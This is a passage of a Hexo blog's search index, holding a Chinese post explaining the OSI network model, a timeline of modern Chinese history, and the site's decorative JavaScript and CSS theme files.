          <category> 玩转PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSI模型</title>
      <link href="/2022/11/29/OSI/"/>
      <url>/2022/11/29/OSI/</url>
      
        <content type="html"><![CDATA[<h2 id="OSI七层模型的设计灵感来自哪里？"><a href="#OSI七层模型的设计灵感来自哪里？" class="headerlink" title="OSI七层模型的设计灵感来自哪里？"></a>OSI七层模型的设计灵感来自哪里？</h2><p>当年制定OSI模型的研究人员，在酒吧喝酒的时候，聊起了白雪公主这部电影，有人就提问了：“要是知道七个小矮人的名字？老子就给谁续杯！“还真有人把七个名字写在了餐巾上，这个时候有位兄弟酒精上头，说这七个小矮人不正好可以拿来作为网络模型吗？于是餐巾都不舍得扔掉。第二天研究人员就闻着这还带有酒味的餐巾开会，一致同意把网络模型划分为7层，这就是折磨人多年的OSI网络参考模型，注意我这里说的是参考，也就是说OSI网络实际中并不使用，我们只是把OSI网络模型作为参考。</p><p>在网络出现问题的时候，可以从一个宏观的整体去分析和解决问题，而且搭建网络的时候也并不一定需要划分为7层，但是当今互联网广泛使用的是TCP/IP网络模型，原本只有4层，随着人们的不断实践后发现，其实划分为5层会更加符合实际.</p><h2 id="但为什么还老面试官喜欢问OSI模型呢？"><a href="#但为什么还老面试官喜欢问OSI模型呢？" class="headerlink" title="但为什么还老面试官喜欢问OSI模型呢？"></a>但为什么还老面试官喜欢问OSI模型呢？</h2><p>其实OSI七层的名字并不难记，七层里的知识才是最复杂的，谁能把这里头的知识都关联起来，遇到问题的时候就能快速处理和解决问题。OSI模型的目的其实很简单，就是为了解决主机之间的网络通讯。比方说华为电脑要和苹果电脑互联，但他们是不同的公司，就有点像普通话和英语进行沟通一样，但是如果大家都统一用OSI网络模型来沟通，情况就不一样了。假设现在苹果电脑自己用应用软件搭建了个网站，华为电脑想要访问这个网站就需要通过软件应用了，比方说用浏览器访问网站，两个应用具体需要如何进行交互就是应用层的事情了，应用层并不是说你需要使用什么应用程序，而是应用如何沟通。</p><p>常见的<strong>应用层</strong>协议就是HTTP了，开发者就可以根据HTTP协议编写应用程序，使得应用之间可以实现沟通，应用层就是最接近用户的那一层，但是应用层只不过是逻辑上把两个应用连通，实际物理上的连通是需要<strong>物理层</strong>的。我们要发送出去的数据在计算机里只不过是无数的0和1（0或者1就叫做比特）物理层就要把这些比特用不同的媒介传输出去，可以用电，用光或者其它形式的电磁波来表示和传输信号，数据从网络接口出去以后会经过不同的网络拓扑，并不是一条线走到底，因此需要中继器和集线器这样的设备。但还是不够，物理层信号要去到哪台设备是需要定向的，因此需要高级一点的网络模型，在数据链路层这里，比特会被封装成<strong>帧</strong>，帧就是这一层表示数据的特殊名字而已，在封装的时候会加上<strong>MAC地址（物理地址）</strong>网卡出厂的时候就有着全球唯一的MAC地址，为了可以通过MAC地址对不同设备进行数据的传输，就出现了<strong>交换机</strong>，这里说的是二层交换机，比方说这里有一台交换机，连接多台主机，发送端发送数据的时候，交换机就知道了<strong>发送端的MAC地址</strong>，如果此时交换机也知道<strong>接收端的MAC地址</strong>，就可以把数据直接发送过去了，物理地址就是这样一跳一跳地进行传递，另外因为物理层在传输0和1的时候，可能会0变成1，以及一定的差错纠正，另外设备之间的传输能力以及接收能力也是个问题，“喷水”式传输很可能这边“夹缝”式接受另一边，因此需要流控制来避免这种不对称。我们知道互联网是一张大网，<strong>物理层如果用MAC物理地址来作为唯一的寻址方法是不科学的</strong>，比如我和你买了同一个厂出的网卡，我和你的网卡如果差别就只有一个字母，但是我和你距离十万八千里，物理地址此时就很难做出快速定位，相当于我有你的名字，但不知道你住哪里，找不到你。因此需要<strong>IP地址来进行寻址和路由选择</strong>，<strong>IP这样的逻辑地址</strong>就是实现端到端的基础了，而不是物理地址那样的跳到跳传输。说到路由选择，也就是说<strong>路由器也是网络层的核心</strong>，<strong>包</strong>就是网络层里数据的名字，在封装为二层的帧之前就是包，路由器根据包里的IP地址进行路由转发地址管理和路由选择就是这一层的核心，物理层虽然有MAC和IP地址可以抵达对方主机，但是对方主机可能运行着无数多个软件进程，假设我用谷歌和火狐浏览器同时登录网站，如何让数据去到指定的软件服务上，就需要用到<strong>端口号</strong>作为地址来定位了，比如客户端这里生成不同的端口号，即时同时访问HTTP端口80也是没问题的，根据不同的源端口号来作出响应就可以了，所以<strong>传输层</strong>在网络层的端到端基础上，实现了服务进程到服务进程的传输，<strong>段</strong>就是传输层里数据的名字，在封装为三层包之前就是段。传输层管理两个节点之间数据的传输，负责可靠传输和不可靠传输，也就是大家熟知的协议TCP和UTP，另外还有一个新的叫QUIC，其中TCP允许应用把字节流变成多份段，而不是整个字节数据完整地发送出去，传输层还有<strong>流量控制</strong>来确保传输速度，再加上<strong>错误控制</strong>来进行数据完整的接收，接下来<strong>会话层</strong>也比较好理解，比方说你现在登录了某个网站，网站服务可以保持你的登录状态，不用每次都输入账号和密码，当然网站服务会管理和控制登录状态。另外会话层还负责同步服务，比方说你上次看到电影高潮的时刻突然停电了，再次登录账号的时候，就可以自动同步到上次看到的时间段，不同计算机内部的各自表达方式可能不太相同，<strong>表示层</strong>就来负责这样的转换，也就是编码和解码。数据往往还需要进行加密，比方说HTTPS(SSL/TLS)就会对我们的数据进行加密和解密，另外我们可能还需要给文件瘦身，压缩也是这一层负责的，物理层，应用层，表示层和会话层的数据统称为应用数据，或者应用负载，也可以叫上层数据，同时也是教科书上说的报文。数据在各层的名字分别是：报文，段，包，顿和比特。比特就地址来说，比特有端口号，IP逻辑地址和MAC物理地址；比特就传输功能来讲，比特有服务进程到服务进程，比特端到端，还有跳到跳。</p><p>了解了各层的作用，现在就可以把全部关联起来，客户端要发送数据，也就是报文。报文来到了传输层，加上端口号，封装成段；加上IP地址，封装成包，注意这里的包是含有目标IP地址的，毕竟你要知道数据要发送到什么地方，但因为目标IP地址不是同一个网络下的，要发送到其它的网络，就需要经过默认网关。现在就出现了个问题，客户端主机最初并不知道默认网关的MAC地址，没有办法封装成帧，这个时候就可以用ARP协议进行广播找到网关IP对应的MAC地址，把包封装成顿，源MAC地址填自己的。假设当前网络有个二层交换机，这个交换机只需要记录下不同的接口对应的MAC地址就好了，交换机收到广播后就帮忙发送出去，人手一份，所以默认网关收到消息后，查看了顿，发现了发送端的MAC地址，再解封发现包里面的IP地址，就会把客户端MAC地址和IP地址关联为一台主机，同时默认网关会把自己的IP地址放入包里，再结合自己的MAC地址封装成顿，默认网关就这样作出响应，发送端就知道默认网关的MAC地址了现在就可以封装成顿，并且发送数据，比特流到了默认网关的时候<br>解封为顿发现是发送给自己的，再解封为包查看到目标IP地址是在另一网络中的，服务器就会进行路由转发<br>服务器最终到达了目的网络，服务器如果目标的网关知道目标IP地址和MAC地址是哪台主机，服务器封装成为帧就可以直接发送过去了，如果不知道也还是可以用ARP喊下街就好，主机收到包确认是自己的IP地址以后，解封查看段可以发现源和目标端口号，用目标端口号给到指定的应用程序，应用程序处理好后，就可以按照源的信息作出响应，回去的原理也是一样的。</p>]]></content>
      
      
      <categories>
          
          <category> CTFer成长之道 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>近现代史-By小吴</title>
      <link href="/2022/11/29/%E5%B0%8F%E5%90%B4%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2022/11/29/%E5%B0%8F%E5%90%B4%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="This-is-a-page"><a href="#This-is-a-page" class="headerlink" title="This is a page!!!"></a>This is a page!!!</h2><p>中国近代史是从第一次鸦片战争1840年到1949年中华人民共和国成立的历史。</p><p>1839年6月：林则徐虎门销烟。</p><p>1840年：鸦片战争爆发。</p><p>1841年：三元里抗英斗争，是中国近代史上中国人民第一次自发的大规模抵抗外国侵略斗争。</p><p>1842年8月：签订《中英南京条约》，是中国近代史上第一个不平等条约，中国开始沦为半殖民地半封建社会。</p><p>1851年：太平天国建立。</p><p>1861年：洋务运动开始。</p><p>1894年：甲午中日战争。</p><p>1895年4月：签订《马关条约》，中国半殖民地半封建化社会程度大大加深。</p><p>1898年9月21日：戊戌变法失败。戊戌变法是一场资产阶级改良运动。</p><p>1899年：义和团运动开始。</p><p>1901年：签订《辛丑条约》，是中国完全沦为半殖民地半封建社会。</p><p>1894年：兴中会成立，中国第一个资产阶级革命团体。</p><p>1905年：中国同盟会成立，创办《民报》。</p><p>1910年：黄花岗起义。</p><p>1911年：武昌起义。</p><p>1912年：1月1日中华民国成立，孙中山任临时大总统，颁布《中华民国临时约法》。</p><p>1912年2月：帝制的终结，标志着清王朝的统治结束。</p><p>1918年：护法运动失败，标志着整个中国民族资产阶级领导的旧民主主义革命的终结。</p><p>1919年：五四运动爆发，是新民主主义的开端。</p><p>1921年7月23日：中共一大的召开，标志中国共产党的成立。</p><p>1922年：中共二大召开，制定反帝反封建的民主革命纲领。</p><p>1923年：中共三大，标志着第一次国共合作的正式形成。</p><p>1924年：国民党一大，提出新三民主义，国共合作正式形成。</p><p>1925年：五卅运动，掀起了全国范围的大革命高潮。</p><p>1927年8月1日：南昌起义，打响了武装反抗国民党反动派的第一枪。</p><p>1927年8月7日：八七会议，开始了从大革命失败到土地革命战争兴起的历史性转折。</p><p>1931年9月18日，日本发动九一八事变。</p><p>1935年1月:遵义会议的召开，解决了军事问题和组织问题。</p><p>1935年12月：中共陕北瓦窑堡召开会议，确定了建立抗日民族统一战线的方针。</p><p>1936年12月12日：西安事变和平解决。</p><p>1937年7月7日：卢沟桥事变，全面抗战的开始。</p><p>1937年12月：南京大屠杀。</p><p>1945年8月15日：日本宣布无条件投降，中国人民最终取得了抗战的伟大胜利。</p><p>1946年6月：国民党军队大举进攻中原解放区，全面内战爆发。</p><p>1949年4月23日：解放军占领国民党的统治中心南京，宣告了延续22年的国民党反动统治的覆灭。</p><p>1949年10月1日，中华人民共和国的成立，标志着中国进入了新民主主义社会。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/cursor.js"/>
      <url>/js/cursor.js</url>
      
        <content type="html"><![CDATA[var CURSOR;Math.lerp = (a, b, n) => (1 - n) * a + n * b;const getStyle = (el, attr) => {    try {        return window.getComputedStyle            ? window.getComputedStyle(el)[attr]            : el.currentStyle[attr];    } catch (e) {}    return "";};class Cursor {    constructor() {        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    move(left, top) {        this.cursor.style["left"] = `${left}px`;        this.cursor.style["top"] = `${top}px`;    }    create() {        if (!this.cursor) {            this.cursor = document.createElement("div");            this.cursor.id = "cursor";            this.cursor.classList.add("hidden");            document.body.append(this.cursor);        }        var el = document.getElementsByTagName('*');        for (let i = 0; i < el.length; i++)            if (getStyle(el[i], "cursor") == "pointer")                this.pt.push(el[i].outerHTML);        document.body.appendChild((this.scr = document.createElement("style")));        // 这里改变鼠标指针的颜色 由svg生成        this.scr.innerHTML = `* {cursor: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8' width='8px' height='8px'><circle cx='4' cy='4' r='4' opacity='1.0' fill='rgb(57, 197, 187)'/></svg>") 4 4, auto}`;    }    refresh() {        this.scr.remove();        this.cursor.classList.remove("hover");        this.cursor.classList.remove("active");        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    init() {        document.onmouseover  = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.add("hover");        document.onmouseout   = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.remove("hover");        document.onmousemove  = e => {(this.pos.curr == null) && this.move(e.clientX - 8, e.clientY - 8); this.pos.curr = {x: e.clientX - 8, y: e.clientY - 8}; this.cursor.classList.remove("hidden");};        document.onmouseenter = e => this.cursor.classList.remove("hidden");        document.onmouseleave = e => this.cursor.classList.add("hidden");        document.onmousedown  = e => this.cursor.classList.add("active");        document.onmouseup    = e => this.cursor.classList.remove("active");    }    render() {        if (this.pos.prev) {            this.pos.prev.x = Math.lerp(this.pos.prev.x, this.pos.curr.x, 0.15);            this.pos.prev.y = Math.lerp(this.pos.prev.y, this.pos.curr.y, 0.15);            this.move(this.pos.prev.x, this.pos.prev.y);        } else {            this.pos.prev = this.pos.curr;        }        requestAnimationFrame(() => this.render());    }}(() => {    CURSOR = new Cursor();    // 需要重新获取列表时，使用 CURSOR.refresh()})();]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/light.js"/>
      <url>/js/light.js</url>
      
        <content type="html"><![CDATA[// 霓虹灯效果// 颜色数组var arr = ["#39c5bb", "#f14747", "#f1a247", "#f1ee47", "#b347f1", "#1edbff", "#ed709b", "#5636ed"];// 颜色索引var idx = 0;// 切换颜色function changeColor() {    // 仅夜间模式才启用    if (document.getElementsByTagName('html')[0].getAttribute('data-theme') == 'dark') {        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = arr[idx] + " 0 0 10px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = arr[idx] + " 0 0 5px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = arr[idx] + " 0 0 12px";            document.getElementsByClassName("author-info__description")[0].style.textShadow = arr[idx] + " 0 0 12px";        } catch {                    }        idx++;        if (idx == 8) {            idx = 0;        }    } else {        // 白天模式恢复默认        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = "#1e1e1ee0 1px 1px 1px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = "";            document.getElementsByClassName("author-info__description")[0].style.textShadow = "";        } catch {                    }    }}// 开启计时器window.onload = setInterval(changeColor, 1200);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[:root {  --trans-light: rgba(255, 255, 255, 0.75);  --trans-dark: rgba(25, 25, 25, 0.6);  --border-style: 1px solid rgb(169, 169, 169);  --backdrop-filter: blur(5px) saturate(150%);}/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }/* 小冰分类分类磁铁黑夜模式适配 *//* 一般状态 */[data-theme="dark"] .magnet_link_context {  background: #1e1e1e;  color: antiquewhite;}/* 鼠标悬浮状态 */[data-theme="dark"] .magnet_link_context:hover {  background: #3ecdf1;  color: #f2f2f2;}/* 翻页按钮居中 */#pagination {  width: 100%;  margin: auto;}/* 一级菜单居中 */#nav .menus_items {  position: absolute !important;  width: fit-content !important;  left: 50% !important;  transform: translateX(-50%) !important;}/* 子菜单横向展示 */#nav .menus_items .menus_item:hover .menus_item_child {  display: flex !important;}/* 这里的2是代表导航栏的第2个元素，即有子菜单的元素，可以按自己需求修改 */.menus_items .menus_item:nth-child(5) .menus_item_child {  left: -38px;}/* 夜间模式菜单栏发光字 */[data-theme="dark"] #nav .site-page,[data-theme="dark"] #nav .menus_items .menus_item .menus_item_child li a {  text-shadow: 0 0 2px rgb(179, 71, 241) !important;}/* 手机端适配 */[data-theme="dark"] #sidebar #sidebar-menus .menus_items .site-page {  text-shadow: 0 0 2px rgb(179, 71, 241) !important;}/* 背景宇宙星光  */#universe{  display: block;  position: fixed;  margin: 0;  padding: 0;  border: 0;  outline: 0;  left: 0;  top: 0;  width: 100%;  height: 100%;  pointer-events: none;  /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */  z-index: -1;}/* 侧边栏个人信息卡片动态渐变色 */#aside-content > .card-widget.card-info {  background: linear-gradient(    -45deg,    #e8d8b9,    #eccec5,    #a3e9eb,    #bdbdf0,    #eec1ea  );  box-shadow: 0 0 5px rgb(66, 68, 68);  position: relative;  background-size: 400% 400%;  -webkit-animation: Gradient 10s ease infinite;  -moz-animation: Gradient 10s ease infinite;  animation: Gradient 10s ease infinite !important;}@-webkit-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@-moz-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}/* 黑夜模式适配 */[data-theme="dark"] #aside-content > .card-widget.card-info {  background: #191919ee;}/* 个人信息Follow me按钮 */#aside-content > .card-widget.card-info > #card-info-btn {  background-color: #3eb8be;  border-radius: 8px;}/* 鼠标样式 */#cursor {  position: fixed;  width: 16px;  height: 16px;  /* 这里改变跟随的底色 */  background: rgb(31, 203, 48);  border-radius: 8px;  opacity: 0.25;  z-index: 10086;  pointer-events: none;  transition: 0.2s ease-in-out;  transition-property: background, opacity, transform;}#cursor.hidden {  opacity: 0;}#cursor.hover {  opacity: 0.1;  transform: scale(2.5);  -webkit-transform: scale(2.5);  -moz-transform: scale(2.5);  -ms-transform: scale(2.5);  -o-transform: scale(2.5);}#cursor.active {  opacity: 0.5;  transform: scale(0.5);  -webkit-transform: scale(0.5);  -moz-transform: scale(0.5);  -ms-transform: scale(0.5);  -o-transform: scale(0.5);}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts > .recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/runtime.js"/>
      <url>/js/runtime.js</url>
      
        <content type="html"><![CDATA[var now=new Date;function createtime(){now.setTime(now.getTime()+1e3);var e=new Date("11/29/2022 00:00:00"),t=Math.trunc(234e8+(now-e)/1e3*17),a=(t/1496e5).toFixed(6),o=new Date("11/29/2022 00:00:00"),r=(now-o)/1e3/60/60/24,i=Math.floor(r),n=(now-o)/1e3/60/60-24*i,s=Math.floor(n);1==String(s).length&&(s="0"+s);var l=(now-o)/1e3/60-1440*i-60*s,g=Math.floor(l);1==String(g).length&&(g="0"+g);var d=(now-o)/1e3-86400*i-3600*s-60*g,b=Math.round(d);1==String(b).length&&(b="0"+b);let c="";c=s<18&&s>=9?`<img class='boardsign' src='https://img.shields.io/badge/F%E5%B0%8F%E5%B1%8B-%E4%B8%8A%E7%8F%AD%E6%91%B8%E9%B1%BC%E4%B8%AD-1ade23?style=social&logo=Buy%20Me%20A%20Coffee' title='距离月入25k也就还差一个大佬带我~'><br> 本站居然运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀 <br> 再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨ `:`<img class='boardsign' src='https://img.shields.io/badge/F小屋-打烊休息啦-6adea8?style=social&logo=coffeescript' title='下班了就该开开心心的玩耍，嘿嘿~'><br> 本站居然运行了 ${i} 天 ${s} 小时 ${g} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀 <br> 再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨ `,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=c)}setInterval((()=>{createtime()}),1e3);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/universe.js"/>
      <url>/js/universe.js</url>
      
        <content type="html"><![CDATA[function dark() {window.requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;var n,e,i,h,t=.05,s=document.getElementById("universe"),o=!0,a="180,184,240",r="226,225,142",d="226,225,224",c=[];function f(){n=window.innerWidth,e=window.innerHeight,i=.216*n,s.setAttribute("width",n),s.setAttribute("height",e)}function u(){h.clearRect(0,0,n,e);for(var t=c.length,i=0;i<t;i++){var s=c[i];s.move(),s.fadeIn(),s.fadeOut(),s.draw()}}function y(){this.reset=function(){this.giant=m(3),this.comet=!this.giant&&!o&&m(10),this.x=l(0,n-10),this.y=l(0,e),this.r=l(1.1,2.6),this.dx=l(t,6*t)+(this.comet+1-1)*t*l(50,120)+2*t,this.dy=-l(t,6*t)-(this.comet+1-1)*t*l(50,120),this.fadingOut=null,this.fadingIn=!0,this.opacity=0,this.opacityTresh=l(.2,1-.4*(this.comet+1-1)),this.do=l(5e-4,.002)+.001*(this.comet+1-1)},this.fadeIn=function(){this.fadingIn&&(this.fadingIn=!(this.opacity>this.opacityTresh),this.opacity+=this.do)},this.fadeOut=function(){this.fadingOut&&(this.fadingOut=!(this.opacity<0),this.opacity-=this.do/2,(this.x>n||this.y<0)&&(this.fadingOut=!1,this.reset()))},this.draw=function(){if(h.beginPath(),this.giant)h.fillStyle="rgba("+a+","+this.opacity+")",h.arc(this.x,this.y,2,0,2*Math.PI,!1);else if(this.comet){h.fillStyle="rgba("+d+","+this.opacity+")",h.arc(this.x,this.y,1.5,0,2*Math.PI,!1);for(var t=0;t<30;t++)h.fillStyle="rgba("+d+","+(this.opacity-this.opacity/20*t)+")",h.rect(this.x-this.dx/4*t,this.y-this.dy/4*t-2,2,2),h.fill()}else h.fillStyle="rgba("+r+","+this.opacity+")",h.rect(this.x,this.y,this.r,this.r);h.closePath(),h.fill()},this.move=function(){this.x+=this.dx,this.y+=this.dy,!1===this.fadingOut&&this.reset(),(this.x>n-n/4||this.y<0)&&(this.fadingOut=!0)},setTimeout(function(){o=!1},50)}function m(t){return Math.floor(1e3*Math.random())+1<10*t}function l(t,i){return Math.random()*(i-t)+t}f(),window.addEventListener("resize",f,!1),function(){h=s.getContext("2d");for(var t=0;t<i;t++)c[t]=new y,c[t].reset();u()}(),function t(){document.getElementsByTagName('html')[0].getAttribute('data-theme')=='dark'&&u(),window.requestAnimationFrame(t)}()};dark()]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
